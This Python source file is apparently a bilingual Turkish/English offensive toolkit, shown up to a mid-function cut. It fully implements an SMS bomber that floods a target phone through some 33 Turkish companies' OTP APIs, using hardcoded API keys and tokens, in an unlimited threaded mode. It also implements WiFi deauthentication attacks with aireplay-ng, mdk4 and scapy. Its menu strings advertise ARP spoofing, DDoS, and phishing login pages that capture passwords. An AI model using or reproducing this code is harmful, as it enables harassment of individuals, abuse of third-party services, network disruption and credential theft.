import platform, os, subprocess, time, socket, threading, json, urllib.request, random, sys, warnings, logging, atexit, requests

logging.getLogger("scapy").setLevel(logging.ERROR)
warnings.filterwarnings("ignore", message="No libpcap")
warnings.filterwarnings("ignore", message="L3WinSocket")

try:
    import colorama
    colorama.init()
except ImportError:
    pass

if platform.system() == "Windows":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

OS = platform.system()
Root = None
System = None
Location = "Home"

Y = "\033[38;5;220m"; M = "\033[38;5;135m"; C = "\033[38;5;51m"
G = "\033[38;5;46m"; W = "\033[38;5;28m"; R = "\033[38;5;196m"; S = "\033[0m"
B = "\033[38;5;27m"
atexit.register(lambda: print(f"{S}", end=""))

LANG = "EN"
DIL = {
    "TR": {
        "ana_menu": "Ana Menü",
        "cikis": "Çıkış",
        "onceki": "Önceki",
        "enter": "ENTER",
        "iptal": "iptal",
        "arayuz": "Arayüz",
        "hedef_ip": "Hedef IP",
        "gateway_ip": "Ağ Geçidi IP",
        "ip_araligi": "IP Aralığı",
        "paket_sayisi": "Paket Sayısı",
        "hata": "Hata",
        "cihaz_bulundu": "cihaz bulundu",
        "cihaz_yok": "Cihaz bulunamadı.",
        "dil_degistir": "Dil Değiştir (TR/EN)",
        "network_tools": "Ağ Araçları",
        "ag_taramasi": "Ağ Taraması",
        "arp_spoof": "ARP Zehirleme",
        "sniffing": "HTTP/DNS Dinleme",
        "bagli_cihazlar": "Bağlı Cihazlar",
        "baglanti_kes": "Bağlantıyı Kes",
        "engelle": "Engelle/Kaldır",
        "wifi_deauth": "WiFi Koparma",
        "sms_bomber": "SMS Bombacısı",
        "ip_geo": "IP Konum",
        "port_scanner": "Port Tara",
        "mac_changer": "MAC Değiştir",
        "ddos": "DDoS Aracı",
        "osint": "OSINT",
        "sherlock": "Kullanıcı Tara",
        "web_ara": "Web Ara",
        "kullanici_adi": "Kullanıcı Adı",
        "sorgu": "Sorgu",
        "sonuc": "sonuç",
        "profil_bulundu": "profil bulundu",
        "profil_yok": "Profil bulunamadı.",
        "site_bulunamadi": "site bulunamadı",
        "osint_baslik": "OSINT - Açık Kaynak İstihbaratı",
        "telefon_no": "Telefon",
        "kac_sms": "SMS Adedi",
        "gecersiz_sayi": "Geçersiz sayı!",
        "gecikme": "Gecikme (sn, öneri 1-3)",
        "thread_sayisi": "İş Parçacığı",
        "gonderiliyor": "Gönderiliyor... (CTRL+C durdurur)",
        "gonderildi": "Gönderildi",
        "api_yanit_yok": "API yanıt vermedi",
        "durduruldu": "Durduruldu.",
        "basarili_basarisiz": "Başarılı: {ok} / Başarısız: {fail}",
        "turkiye_uyari": "SADECE TÜRKİYE'DEKİ NUMARALAR İÇİN ÇALIŞIR! (+90)",
        "turbo_mod": "Sınırsız = T yazın (CTRL+C durdurur)",
        "linux_gerekli": "Linux gerekli!",
        "root_gerekli": "Root gerekli! sudo ile çalıştır.",
        "root_yetki": "Root yetkisi gerekli!",
        "hedef_bssid": "Hedef BSSID",
        "monitor_baslat": "İzleme modu başlatılıyor ({iface})...",
        "scapy_yok": "scapy kurulu değil! pip install scapy",
        "ip_adresi": "IP Adresi",
        "sorgulaniyor": "{ip} sorgulanıyor...",
        "ulke": "Ülke",
        "sehir": "Şehir",
        "bolge": "Bölge",
        "isp": "ISP",
        "enlem_boylam": "Enlem/Boylam",
        "zaman": "Zaman",
        "baglanti_hatasi": "Bağlantı: {e}",
        "ip_domain": "IP/Domain",
        "taranıyor": "{hedef} taranıyor (1-1024)...",
        "acik_port": "açık port:",
        "servis": "Servis",
        "acik_port_yok": "Açık port bulunamadı.",
        "rastgele_mac": "Rastgele MAC",
        "ozel_mac": "Özel MAC",
        "yeni_mac": "Yeni MAC: {mac}",
        "mac_adresi": "MAC adresi",
        "egitim_uyari": "SADECE EĞİTİM AMAÇLIDIR!",
        "hedef_ip_domain": "Hedef IP/Domain",
        "hedef_port": "Hedef Port",
        "gecersiz_port": "Geçersiz port!",
        "gecersiz": "Geçersiz!",
        "thread_rapor": "{ip}:{port} -> {t} thread",
        "durdurur": "CTRL+C durdurur",
        "kaydet": "Kaydedilsin mi?",
        "kaydedildi": "Kaydedildi",
        "phishing": "Oltalama Aracı",
        "phishing_baslik": "Oltalama - Sahte Sayfa",
        "saf_page_olustur": "Sahte Sayfa Oluştur",
        "phishing_server": "Oltalama Sunucusu Başlat",
        "saf_page_sec": "Sayfa seçin",
        "instagram_fake": "Instagram Giriş",
        "facebook_fake": "Facebook Giriş",
        "google_fake": "Google Giriş",
        "twitter_fake": "Twitter/X Giriş",
        "port_bilgi": "Port (varsayılan: 8080)",
        "server_basladi": "Sunucu başlatıldı",
        "durduruldu_server": "Sunucu durduruldu.",
        "saf_page_kaydedildi": "Sayfa kaydedildi: {dosya}",
        "kullanici_ekle": "Kullanıcı: {k}, Şifre: {s}",
        "php_gerekli": "PHP kurulu değil! https://windows.php.net/download/",
        "port_kullaniliyor": "{p} portu kullanımda, başka port dene.",
        "sayfa_yok": "Önce sahte sayfa oluşturun! (1. seçenek)",
        "cloudflare_sor": "Bulut tünel kullanılsın mı? (cloudflared gerekli)",
        "cf_bulunamadi": "cloudflared bulunamadı, indiriliyor...",
        "cf_indir": "cloudflared indiriliyor...",
        "cf_indir_hata": "cloudflared indirilemedi! Elle kur: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/",
        "cf_basladi": "Bulut tünel başlatıldı",
        "public_url": "Genel URL: {url}",
        "vizitor_bilgi": "Ziyaretçi bilgisi alındı",
        "ip_adres": "IP: {ip}",
        "ulke_bilgi": "Ülke: {ulke}",
        "sehir_bilgi": "Şehir: {sehir}",
        "isp_bilgi": "ISS: {isp}",
        "tarayici_bilgi": "Tarayıcı: {ua}",
        "api_turk": "Türk API'leri (33 servis)",
        "api_uluslararasi": "Uluslararası API'ler (textbelt vb.)",
        "telefon_osint": "Telefon Numarası OSINT",
        "google_dorking": "Google Dorking",
        "kaydedildi": "Sonuçlar {dosya} dosyasına kaydedildi",
        "operator": "Operatör",
        "numara_analiz": "Numara Analizi",
        "dork_sorgu": "Dork sorgusu",
        "sonuc_sayisi": "Sonuç sayısı",
        "telefon_no_gir": "Telefon numarası (05XX, Enter=iptal)",
        "kac_sonuc": "Kaç sonuç istiyorsun?",
        "kaydet_sor": "Sonuçlar kaydedilsin mi?",
    },
    "EN": {
        "ana_menu": "Main Menu",
        "cikis": "Exit",
        "onceki": "Previous",
        "enter": "ENTER",
        "iptal": "cancel",
        "arayuz": "Interface",
        "hedef_ip": "Target IP",
        "gateway_ip": "Gateway IP",
        "ip_araligi": "IP range",
        "paket_sayisi": "Packet count",
        "hata": "Error",
        "cihaz_bulundu": "devices found",
        "cihaz_yok": "No devices found.",
        "dil_degistir": "Change Language (TR/EN)",
        "network_tools": "Network Tools",
        "ag_taramasi": "Network Scan",
        "arp_spoof": "ARP Spoofing (MITM)",
        "sniffing": "HTTP/DNS Sniffing",
        "bagli_cihazlar": "Connected Devices",
        "baglanti_kes": "Disconnect",
        "engelle": "Block/Unblock Internet",
        "wifi_deauth": "WiFi Deauth",
        "sms_bomber": "SMS Bomber",
        "ip_geo": "IP Geolocation",
        "port_scanner": "Port Scanner",
        "mac_changer": "MAC Changer",
        "ddos": "DDoS Tool",
        "osint": "OSINT Tool",
        "sherlock": "Username Search",
        "web_ara": "Web Search",
        "kullanici_adi": "Username",
        "sorgu": "Search query",
        "sonuc": "results",
        "profil_bulundu": "profiles found",
        "profil_yok": "No profiles found.",
        "site_bulunamadi": "sites not found",
        "osint_baslik": "OSINT - Open Source Intelligence",
        "telefon_no": "Phone Number",
        "kac_sms": "SMS count",
        "gecersiz_sayi": "Invalid number!",
        "gecikme": "Delay (seconds, suggest 1-3)",
        "thread_sayisi": "Thread count",
        "gonderiliyor": "Sending... (CTRL+C to stop)",
        "gonderildi": "Sent",
        "api_yanit_yok": "API no response",
        "durduruldu": "Stopped.",
        "basarili_basarisiz": "Success: {ok} / Failed: {fail}",
        "turkiye_uyari": "ONLY WORKS FOR TURKISH NUMBERS! (+90)",
        "turbo_mod": "Unlimited = T (CTRL+C to stop)",
        "linux_gerekli": "Linux required!",
        "root_gerekli": "Root required! Run with sudo.",
        "root_yetki": "Root permission required!",
        "hedef_bssid": "Target BSSID",
        "monitor_baslat": "Starting monitor mode ({iface})...",
        "scapy_yok": "scapy not installed! pip install scapy",
        "ip_adresi": "IP address",
        "sorgulaniyor": "Querying {ip}...",
        "ulke": "Country",
        "sehir": "City",
        "bolge": "Region",
        "isp": "ISP",
        "enlem_boylam": "Lat/Lon",
        "zaman": "Timezone",
        "baglanti_hatasi": "Connection: {e}",
        "ip_domain": "IP/Domain",
        "taranıyor": "Scanning {hedef} (1-1024)...",
        "acik_port": "open ports:",
        "servis": "Service",
        "acik_port_yok": "No open ports found.",
        "rastgele_mac": "Random MAC",
        "ozel_mac": "Custom MAC",
        "yeni_mac": "New MAC: {mac}",
        "mac_adresi": "MAC address",
        "egitim_uyari": "FOR EDUCATIONAL USE ONLY!",
        "hedef_ip_domain": "Target IP/Domain",
        "hedef_port": "Target Port",
        "gecersiz_port": "Invalid port!",
        "gecersiz": "Invalid!",
        "thread_rapor": "{ip}:{port} -> {t} threads",
        "durdurur": "CTRL+C to stop",
        "kaydet": "Save results?",
        "kaydedildi": "Saved",
        "phishing": "Phishing Tool",
        "phishing_baslik": "Phishing - Fake Page Generator",
        "saf_page_olustur": "Create Fake Page",
        "phishing_server": "Start Phishing Server",
        "saf_page_sec": "Select fake page",
        "instagram_fake": "Instagram Login",
        "facebook_fake": "Facebook Login",
        "google_fake": "Google Login",
        "twitter_fake": "Twitter/X Login",
        "port_bilgi": "Port (default 8080)",
        "server_basladi": "Server started",
        "durduruldu_server": "Server stopped.",
        "saf_page_kaydedildi": "Page saved: {dosya}",
        "kullanici_ekle": "User: {k}, Pass: {s}",
        "php_gerekli": "PHP not installed! https://windows.php.net/download/",
        "port_kullaniliyor": "Port {p} in use, try another port.",
        "sayfa_yok": "Create a fake page first! (Option 1)",
        "cloudflare_sor": "Use Cloudflare tunnel? (requires cloudflared)",
        "cf_bulunamadi": "cloudflared not found, downloading...",
        "cf_indir": "Downloading cloudflared...",
        "cf_indir_hata": "cloudflared download failed! Manual: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/",
        "cf_basladi": "Cloudflare tunnel started",
        "public_url": "Public URL: {url}",
        "vizitor_bilgi": "Visitor info captured",
        "ip_adres": "IP: {ip}",
        "ulke_bilgi": "Country: {ulke}",
        "sehir_bilgi": "City: {sehir}",
        "isp_bilgi": "ISP: {isp}",
        "tarayici_bilgi": "Browser: {ua}",
        "api_turk": "Turkish APIs (18 services)",
        "api_uluslararasi": "International APIs (textbelt etc.)",
        "telefon_osint": "Phone Number OSINT",
        "google_dorking": "Google Dorking",
        "kaydedildi": "Results saved to {dosya}",
        "operator": "Carrier",
        "numara_analiz": "Number Analysis",
        "dork_sorgu": "Dork query",
        "sonuc_sayisi": "Result count",
        "telefon_no_gir": "Phone number (05XX, Enter=cancel)",
        "kac_sonuc": "How many results?",
        "kaydet_sor": "Save results?",
    }
}
def _(anahtar): return DIL.get(LANG, DIL["TR"]).get(anahtar, anahtar)

if OS == "Windows":
    import ctypes
    System = "Windows"
    Root = ctypes.windll.shell32.IsUserAnAdmin() != 0
elif OS == "Linux":
    System = "Linux"
    Root = os.geteuid() == 0
elif OS == "Darwin":
    System = "Mac OS"
    Root = os.geteuid() == 0
else:
    System = "Unknown"
    Root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False

# Küçük ekran tespiti (terminal < 60 sütun → 640px altı)
def kucuk_ekran():
    try:
        import shutil
        return shutil.get_terminal_size().columns < 60
    except:
        return False

def clear_screen():
    subprocess.call("cls" if OS == "Windows" else "clear", shell=True)

def bekle(s=1.5):
    time.sleep(s)

def cizgi():
    print(f"  {W}{'─'*30}{S}")

def baslik(txt):
    print(f"\n  {W}{'>>'} {txt.upper()} {'<<'}{S}\n")

def info(m):
    print(f"{C}  [>]{S} {m}")

def ok(m):
    print(f"{G}  [+]{S} {m}")

def fail(m):
    print(f"{R}  [-]{S} {m}")

def warn(m):
    print(f"{Y}  [!]{S} {m}")

def soru(prompt, default=None):
    if default is not None and default != "":
        g = input(f"  {W}{prompt}{S} {Y}[{default}]:{S} ")
    else:
        g = input(f"  {W}{prompt}{S} ")
    if g.strip() == "0":
        return None
    if g.strip() == "" and default is not None and default != "":
        return default
    if g.strip() == "":
        return None
    return g.strip()

def secim_menu(ops):
    print()
    for k, v in ops:
        renk = R if k == "0" else W
        print(f"  {renk}[{k}]{S} {v}")
    return input(f"\n  {W}>{S} ")

def durum_cubugu():
    root_str = f"{G}ROOT{S}" if Root else f"{R}USER{S}"
    print(f"  {B}[{S} {root_str} {B}|{S} {System} {B}|{S} {tespit_arayuz()} {B}]{S}\n")

def tespit_arayuz():
    if System == "Linux":
        try:
            arayuzler = os.listdir("/sys/class/net/")
            for oncelikli in ["wlan0", "wlan1", "eth0", "ens33", "enp0s3"]:
                if oncelikli in arayuzler:
                    return oncelikli
            return arayuzler[0] if arayuzler else "wlan0"
        except:
            return "wlan0"
    elif System == "Windows":
        try:
            r = subprocess.run(["wmic", "nic", "get", "NetConnectionID"], capture_output=True, text=True, timeout=5)
            satirlar = [s.strip() for s in r.stdout.split("\n") if s.strip() and "NetConnectionID" not in s and s.strip()]
            for oncelikli in ["Wi-Fi", "WiFi", "Ethernet"]:
                for s in satirlar:
                    if oncelikli.lower() in s.lower():
                        return s
            return satirlar[0] if satirlar else "Ethernet"
        except:
            return "Ethernet"
    return "eth0"

def sor_arayuz():
    default = tespit_arayuz()
    g = soru(f"{_('arayuz')} (0={_('iptal')})", default)
    return g if g else None

def gateway_bul():
    if System == "Windows":
        for deneme in [
            ["ipconfig"],
            ["route", "print", "0.0.0.0"],
            ["netsh", "interface", "ip", "show", "config"],
            ["powershell", "-c", "(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop"],
        ]:
            try:
                r = subprocess.run(deneme, capture_output=True, text=True, timeout=5)
                for satir in r.stdout.split("\n"):
                    s = satir.lower()
                    ip_src = None
                    if "default gateway" in s or "varsay" in s or "ag gecidi" in s:
                        for b in satir.split(":"):
                            b = b.strip()
                            if b.count(".") == 3 and all(p.isdigit() for p in b.split(".")):
                                ip_src = b
                    if "0.0.0.0" in satir:
                        b = satir.split()
                        for i, k in enumerate(b):
                            if k.count(".") == 3 and all(p.isdigit() for p in k.split(".")):
                                if b[i-1] == "0.0.0.0" if i > 0 else False:
                                    ip_src = k
                    if ip_src:
                        parts = ip_src.split(".")
                        if len(parts) == 4 and all(0 <= int(p) <= 255 for p in parts):
                            return ip_src
            except:
                pass
        try:
            r = subprocess.run(["ping", "-n", "1", "-w", "500", "192.168.1.1"], capture_output=True, timeout=3)
            if r.returncode == 0:
                return "192.168.1.1"
        except:
            pass
        return ""
    else:
        try:
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            b = r.stdout.split()
            for i, k in enumerate(b):
                if k == "via" and i + 1 < len(b):
                    return b[i + 1]
        except:
            pass
        return "192.168.1.1"

def tablo(baslik_liste, satirlar):
    kolon_say = len(baslik_liste)
    genislikler = [len(h) for h in baslik_liste]
    for s in satirlar:
        for i in range(min(len(s), kolon_say)):
            genislikler[i] = max(genislikler[i], len(str(s[i])) + 2)
    fmt = "  ".join(f"{{:<{w}}}" for w in genislikler)
    print(f"  {fmt.format(*baslik_liste)}")
    print(f"  {'  '.join('─'*w for w in genislikler)}")
    for s in satirlar:
        dolu = list(s) + [""] * (kolon_say - len(s))
        print(f"  {fmt.format(*dolu)}")

def sms_bomber():
    clear_screen(); baslik(_("sms_bomber"))
    warn(_("turkiye_uyari")); print()
    # Mod seçimi: Türk API'leri vs Uluslararası API'ler
    mod = secim_menu([
        ("1", _("api_turk")),
        ("2", _("api_uluslararasi")),
        ("0", _("onceki"))
    ])
    if mod == "0": return "Home"
    uluslararasi = (mod == "2")
    if uluslararasi:
        phone = soru(f"{_('telefon_no')} (+90...XXX, 0={_('iptal')})")
    else:
        phone = soru(f"{_('telefon_no')} (5XX, 0={_('iptal')})")
    if not phone: return "Home"
    phone = phone.strip().lstrip("0")
    if len(phone) != 10 or not phone.isdigit():
        fail(_("gecersiz_sayi")); bekle(); return "Home"
    adet = input(f"  {W}{_('kac_sms')}{S} {Y}({_('turbo_mod')}):{S} ").strip()
    if adet.upper() == "T" or adet == "":
        adet = None
    else:
        try: adet = int(adet)
        except: fail(_("gecersiz_sayi")); bekle(); return "Home"

    if uluslararasi:
        mesaj = "Merhaba, bu bir test mesajidir."
        servisler = [
            ("Textbelt", "https://textbelt.com/text",
             {"phone": f"90{phone}", "message": mesaj, "key": "textbelt"}, "form"),
            ("Callmebot", "https://api.callmebot.com/whatsapp.php",
             {"phone": f"90{phone}", "text": mesaj, "apikey": ""}, "form"),
        ]
    else:
        servisler = [
            ("KahveDunyasi", "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
             {"countryCode": "90", "phoneNumber": phone}, "json"),
            ("BIM", "https://bim.veesk.net/service/v1.0/account/login",
             {"phone": phone}, "json"),
            ("EnglishHome", "https://www.englishhome.com/api/member/sendOtp",
             {"Phone": phone, "XID": ""}, "json"),
            ("Hayatsu", "https://api.hayatsu.com.tr/api/SignUp/SendOtp",
             {"mobilePhoneNumber": phone, "actionType": "register"}, "json"),
            ("HizliEcza", "https://prod.hizliecza.net/mobil/account/sendOTP",
             {"otpOperationType": 1, "phoneNumber": f"+90{phone}"}, "json"),
            ("MetroTR", "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
             {"methodType": "2", "mobilePhoneNumber": phone}, "json"),
            ("FileMarket", "https://api.filemarket.com.tr/v1/otp/send",
             {"mobilePhoneNumber": f"90{phone}"}, "json"),
            ("Komagene", "https://gateway.komagene.com.tr/auth/auth/smskodugonder",
             {"FirmaId": 32, "Telefon": phone}, "json"),
            ("UysalMarket", "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
             {"phone_number": phone}, "json"),
            ("Yapp", "https://yapp.com.tr/api/mobile/v1/register",
             {"app_version": "1.1.5", "code": "tr", "device_type": "I",
              "email": f"user{phone[-4:]}@mail.com", "firstname": "Test",
              "lastname": "User", "phone_number": phone, "sms_code": "",
              "language_id": "2", "is_allow_to_communication": "1"}, "json"),
            ("LittleCaesars", "https://api.littlecaesars.com.tr/api/web/Member/Register",
             {"CampaignInform": True, "Email": f"user{phone[-4:]}@mail.com",
              "InfoRegister": True, "IsLoyaltyApproved": True,
              "NameSurname": "Test User", "Password": "Test123..abc",
              "Phone": phone, "SmsInform": True}, "json"),
            ("Domino's", "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
             {"email": f"user{phone[-4:]}@mail.com", "isSure": False, "mobilePhone": phone}, "json"),
            ("Domino's2", "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
             {"email": f"domino{phone[-4:]}@mail.com", "isSure": False, "mobilePhone": phone}, "json"),
            ("Domino's3", "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
             {"email": f"pizza{phone[-4:]}@mail.com", "isSure": False, "mobilePhone": phone}, "json"),
            ("Frink", "https://api.frink.com.tr/api/auth/postSendOTP",
             {"areaCode": "90", "phoneNumber": f"90{phone}"}, "json",
             {"User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1"}),
            ("Bodrum", "https://gandalf.orwi.app/api/user/requestOtp",
             {"gsm": f"+90{phone}", "source": "orwi"}, "json",
             {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"}),
            ("Pidem", "https://restashop.azurewebsites.net/graphql/",
             {"query": "mutation($p:String){sendOtpSms(phone:$p){resultStatus}}", "variables": {"p": phone}}, "json"),
            ("Koton", "https://www.koton.com/users/register/",
             {"phone": f"0{phone}", "email": f"user{phone[-4:]}@mail.com"}, "form"),
            ("Alixavien", "https://www.alixavien.com.tr/api/member/sendOtp",
             {"Phone": phone}, "json"),
            ("JimmyKey", "https://www.jimmykey.com/tr/p/User/SendConfirmationSms",
             {"gsm": phone}, "get"),
            ("WMF", "https://www.wmf.com.tr/users/register/",
             {"phone": f"0{phone}", "email": f"user{phone[-4:]}@mail.com", "first_name": "Test",
              "last_name": "User", "password": "Test123..abc", "date_of_birth": "1990-01-01",
              "gender": "male", "confirm": "true", "email_allowed": "true"}, "form"),
            ("Suiste", "https://suiste.com/api/auth/code",
             {"action": "register", "gsm": phone, "full_name": "Test User",
              "password": "Test123", "device_id": phone, "is_contract": "1",
              "is_advertisement": "1"}, "form"),
            ("KimGb", "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",
             {"msisdn": f"90{phone}"}, "json"),
            ("TiklaGelsin", "https://svc.apps.tiklagelsin.com/user/graphql",
             {"operationName": "GENERATE_OTP",
              "query": "mutation GENERATE_OTP($phone:String,$challenge:String,$deviceUniqueId:String){generateOtp(phone:$phone,challenge:$challenge,deviceUniqueId:$deviceUniqueId)}",
              "variables": {"phone": f"+90{phone}", "challenge": phone, "deviceUniqueId": phone}}, "json"),
            ("Naosstars", "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
             {"telephone": f"+90{phone}", "type": "register"}, "json",
             {"Uniqid": phone, "Device-Id": phone, "Globaluuidv4": phone, "Apitype": "mobile_app"}),
            ("Akasya", "https://akasyaapi.poilabs.com/v1/en/sms",
             {"phone": phone}, "json",
             {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}),
            ("Akbati", "https://akbatiapi.poilabs.com/v1/en/sms",
             {"phone": phone}, "json",
             {"X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}),
            ("Porty", "https://panel.porty.tech/api.php",
             {"job": "start_login", "phone": phone}, "json",
             {"Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}),
            ("Tasdelen", "https://tasdelen.sufirmam.com/mobile/send-otp",
             {"phone": phone}, "json"),
            ("KofteciYusuf", "https://gateway.poskofteciyusuf.com/auth/auth/smskodugonder",
             {"FirmaId": 82, "Telefon": phone, "FireBaseCihazKey": None}, "json",
             {"Firmaid": "82", "Ostype": "iOS", "Appversion": "4.0.4.0"}),
            ("Coffy", "https://user-api-gw.coffy.com.tr/user/signup",
             {"countryCode": "90", "gsm": phone, "isKVKKAgreementApproved": True,
              "isUserAgreementApproved": True, "name": "Test User"}, "json",
             {"Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"}),
            ("Hamidiye", "https://bayi.hamidiye.istanbul/hamidiyeMobile/send-otp",
             {"isGuest": False, "phone": phone}, "json"),
            ("Orwi", "https://gandalf.orwi.app/api/user/requestOtp",
             {"gsm": f"+90{phone}", "source": "orwi"}, "json",
             {"Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg"}),
        ]

    ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
    basarili = basarisiz = sira = 0
    kilit = threading.Lock()
    dur = threading.Event()

    def sms_gonder():
        nonlocal basarili, basarisiz, sira
        while not dur.is_set():
            if adet is not None:
                with kilit:
                    if sira >= adet: return
            ad, url, veri, tip, *ek = random.choice(servisler)
            if dur.is_set(): return
            if adet is not None:
                with kilit:
                    if sira >= adet: return
                    sira += 1; no = sira
            else:
                with kilit: sira += 1; no = sira
            try:
                h = {"User-Agent": ua}
                if ek: h.update(ek[0])
                if tip == "form":
                    h["Content-Type"] = "application/x-www-form-urlencoded"
                    r = requests.post(url, data=veri, headers=h, timeout=6)
                elif tip == "get":
                    r = requests.get(url, params=veri, headers=h, timeout=6)
                else:
                    r = requests.post(url, json=veri, headers=h, timeout=6)
                if r.status_code == 200:
                    with kilit: basarili += 1
                    print(f"{G}  [+]{S} #{no} {ad}")
                else:
                    with kilit: basarisiz += 1
                    print(f"{R}  [-]{S} #{no} {ad}")
                time.sleep(random.uniform(0.2, 0.5))
            except:
                with kilit: basarisiz += 1
                print(f"{C}  [>]{S} #{no} {ad}")

    info(f"0{phone} | {'SINIRSIZ' if adet is None else adet}")
    warn(f"{_('gonderiliyor')}\n")

    thread_list = []
    for _i in range(3):
        t = threading.Thread(target=sms_gonder, daemon=True)
        t.start(); thread_list.append(t)

    try:
        while any(t.is_alive() for t in thread_list):
            time.sleep(0.1)
    except KeyboardInterrupt:
        dur.set()
        warn(_("durduruldu"))
    print(); ok(_("basarili_basarisiz").format(ok=basarili, fail=basarisiz))
    input(f"\n  {Y}{_('enter')}{S} "); return "Home"

def wifi_deauth():
    clear_screen(); baslik(_("wifi_deauth"))
    if System == "Windows":
        fail(_("linux_gerekli")); input(f"  {Y}{_('enter')}{S} "); return "Home"
    if not Root:
        fail(_("root_gerekli")); input(f"  {Y}{_('enter')}{S} "); return "Home"
    secim = secim_menu([("1","Aircrack-ng (aireplay-ng)"), ("2","MDK4"), ("3","Scapy Deauth"), ("0",_("onceki"))])
    if secim == "0": return "Home"
    sudo = "" if System == "Windows" else "sudo "
    interface = sor_arayuz()
    if not interface: return "Home"
    bssid = soru(f"{_('hedef_bssid')} (0={_('iptal')})")
    if not bssid: return "Home"
    if secim == "1":
        info(_("monitor_baslat").format(iface=interface))
        os.system(f"{sudo}airmon-ng start {interface}")
        os.system(f"{sudo}aireplay-ng -0 0 -a {bssid} {interface}mon")
    elif secim == "2":
        os.system(f"{sudo}mdk4 {interface} d -a {bssid}")
    elif secim == "3":
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            os.system(f"{sudo}airmon-ng start {interface}")
            p = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(p, iface=interface+"mon", count=500, inter=0.1, verbose=0)
            os.system(f"{sudo}airmon-ng stop {interface}mon")
        except ImportError:
            fail(_("scapy_yok"))
        except PermissionError:
            fail(_("root_yetki"))
        except KeyboardInterrupt:
            ok(_("durduruldu"))
    input(f"  {Y}{_('enter')}{S} "); return "Home"

def ag_tara(interface, ip_araligi):
    from ipaddress import ip_network, ip_address
    cihazlar = []; gorulen = set()

    def isim_bul(ip):
        try:
            h = socket.gethostbyaddr(ip)[0]
            _dns_cache[ip] = h
            return h
        except:
            _dns_cache[ip] = ip
            return ""

    def ekle(ip, mac):
        if ip in gorulen or mac.count(":") != 5: return
        try:
            a = ip_address(ip)
            if a.is_multicast or a.is_loopback or ip.endswith(".255"): return
        except:
            return
        gorulen.add(ip); cihazlar.append({"ip": ip, "mac": mac, "isim": isim_bul(ip)})

    try:
        from scapy.all import ARP, Ether, srp
        ag = ip_network(ip_araligi, strict=False)
        r = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ag)), iface=interface, timeout=5, verbose=0)[0]
        for g, a in r: ekle(a.psrc, a.hwsrc)
        return cihazlar
    except:
        pass
    try:
        sonuc = subprocess.run(["arp", "-a"] if System == "Windows" else ["arp", "-a", "-n"], capture_output=True, text=True)
        for satir in sonuc.stdout.split("\n"):
            b = satir.split()
            if len(b) >= 3 and "." in b[0]:
                ip = b[0]; mac = b[1].replace("-", ":")
                if mac.count(":") == 5: ekle(ip, mac)
    except:
        pass
    return cihazlar

def getmac(ip, interface=None):
    try:
        from scapy.all import ARP, Ether, srp
        r = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=interface, timeout=3, verbose=0)[0]
        if r: return r[0][1].hwsrc
    except:
        pass
    if System == "Windows":
        r = subprocess.run(["arp", "-a", ip], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if ip in satir:
                for b in satir.split():
                    if "-" in b and len(b.replace("-","")) == 12: return b.replace("-", ":")
                    if ":" in b and len(b.replace(":","")) == 12: return b
    else:
        r = subprocess.run(["arp", "-n", ip], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if ip in satir:
                for b in satir.split():
                    if ":" in b and len(b.replace(":","")) == 12: return b
    info(f"{ip} icin MAC bulunamadi, ping atiliyor...")
    subprocess.run(["ping", "-n", "1", ip] if System == "Windows" else ["ping", "-c", "1", ip], capture_output=True, timeout=3)
    time.sleep(0.5)
    if System == "Windows":
        r = subprocess.run(["arp", "-a", ip], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if ip in satir:
                for b in satir.split():
                    if "-" in b and len(b.replace("-","")) == 12: return b.replace("-", ":")
    return None

def kendi_mac_al(interface):
    if System == "Linux":
        try:
            with open(f"/sys/class/net/{interface}/address") as f: return f.read().strip()
        except:
            pass
    elif System == "Windows":
        for cmd in [
            ["wmic", "nic", "where", f'NetConnectionID="{interface}"', "get", "MACAddress"],
            ["getmac", "/FO", "CSV", "/NH"],
        ]:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                for satir in r.stdout.split("\n"):
                    mac = satir.strip().strip('"').split(",")[0]
                    if "-" in mac and len(mac) == 17: return mac.replace("-", ":")
            except:
                pass
        r = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=5)
        for satir in r.stdout.split("\n"):
            if "Physical Address" in satir or "Fiziksel Adres" in satir:
